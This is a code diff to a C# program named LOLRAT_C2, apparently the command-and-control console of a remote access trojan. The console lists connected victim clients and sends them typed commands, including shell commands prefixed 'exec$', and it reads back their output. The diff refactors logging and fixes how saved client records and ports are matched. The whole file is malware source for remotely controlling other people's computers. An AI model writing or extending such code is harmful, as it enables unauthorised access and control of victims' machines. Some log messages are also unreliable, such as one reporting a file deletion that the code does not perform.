@@ -71,6 +71,8 @@ namespace LOLRAT_C2
                     {
                         listBoxClients.Items.Add(clientEndPoint);
                         InfoOutput("New client! IP: " + clientEndPoint + "\r\n");
+                        // Wait for 1 seconds then call "InitializeClientInfo()"
+                        Task.Delay(1000).ContinueWith(t => InitializeClientInfo());    
                     }));
 
                     // Extract IP and Port and add them to the DataGridView
@@ -367,14 +369,14 @@ namespace LOLRAT_C2
                                 {
                                     byte[] data = Encoding.ASCII.GetBytes(txtCommand.Text);
                                     selectedClient.Stream.Write(data, 0, data.Length);
-                                    txtOutput.AppendText("Executed this: " + txtCommand.Text + "\r\n");
+                                    InfoOutput("Executed this: " + txtCommand.Text + "\r\n");
                                 }
                                 else if (ActiveWindow == "Terminal")
                                 {
                                     string Command = ("exec$" + txtCommand.Text);
                                     byte[] data = Encoding.ASCII.GetBytes(Command);
                                     selectedClient.Stream.Write(data, 0, data.Length);
-                                    txtOutput.AppendText("Executed this: " + Command + "\r\n");
+                                    InfoOutput("Executed this: " + Command + "\r\n");
                                 }
 
                             }
@@ -409,7 +411,7 @@ namespace LOLRAT_C2
                     if (bytesRead > 0)
                     {
                         string receivedText = Encoding.UTF8.GetString(data, 0, bytesRead);
-                        Invoke(new Action(() => txtOutput.AppendText(receivedText + Environment.NewLine)));
+                        Invoke(new Action(() => InfoOutput(receivedText + Environment.NewLine)));
 
                         // Update the "last seen" timestamp when data is received
                         clientInfo.LastSeen = DateTime.Now;
@@ -460,7 +462,7 @@ namespace LOLRAT_C2
                     // Output that a client has disconnected
                     Invoke(new Action(() =>
                     {
-                        txtOutput.AppendText("Client disconnected: " + clientInfo.IP + ":" + clientInfo.Port + "\r\n");
+                        InfoOutput("Client disconnected: " + clientInfo.IP + ":" + clientInfo.Port + "\r\n");
                     }));
 
                     // Check if the exception is caused by a client disconnection
@@ -546,11 +548,20 @@ namespace LOLRAT_C2
                     {
                         string clientIP = fileNameParts[2].Replace(".txt", "");
                         DebugOutput("Extracted the following IP from \"{}\": " + clientIP);
+                        
                         // Find port that matches clientIP from DataGridView
+                        int clientPort = 0;
+                        foreach (ClientInfo client in connectedClients)
+                        {
+                            if (client.IP == clientIP)
+                            {
+                                clientPort = client.Port;
+                                DebugOutput("Found port: " + clientPort);
+                                break;
+                            }
+                        }
 
-
-
-                        ClientInfo clientInfo = FindClientByIPAndPort(clientIP, 0);
+                        ClientInfo clientInfo = FindClientByIPAndPort(clientIP, clientPort);
                         if (clientInfo != null)
                         {
                             // Replace the found client that was found's info with the info from the file.
@@ -562,11 +573,9 @@ namespace LOLRAT_C2
                                 {
                                     clientInfo.IP = lineParts[0].Split(':')[0];
                                     DebugOutput("Found IP: " + lineParts[0].Split(':')[0]);
-                                    clientInfo.Port = int.Parse(lineParts[0].Split(':')[1]);
                                     DebugOutput("Found Port: " + lineParts[0].Split(':')[1]);
                                     clientInfo.FirstSeen = DateTime.Parse(lineParts[1]);
                                     DebugOutput("Found FirstSeen: " + lineParts[1]);
-                                    clientInfo.LastSeen = DateTime.Parse(lineParts[2]);
                                     DebugOutput("Found LastSeen: " + lineParts[2]);
                                 }
                                 else
@@ -575,6 +584,12 @@ namespace LOLRAT_C2
                                     //File.Delete(clientInfoFile);
                                     DebugOutput("Saved file was not in the correct format. Deleted it.");
                                 }
+
+                                // Set clientInfo stats to be as file says
+                                clientInfo.IP = lineParts[0].Split(':')[0];
+                                clientInfo.Port = int.Parse(lineParts[0].Split(':')[1]);
+                                clientInfo.FirstSeen = DateTime.Parse(lineParts[1]);
+                                
                                 // Replace the DataGridView row with the new info from file execpt last seen.
                                 dgvClients.Invoke(new Action(() =>
                                 {
@@ -589,8 +604,8 @@ namespace LOLRAT_C2
                                         }
                                     }
                                 }));
-                            
-                            
+
+
                             }
                         }
                         else
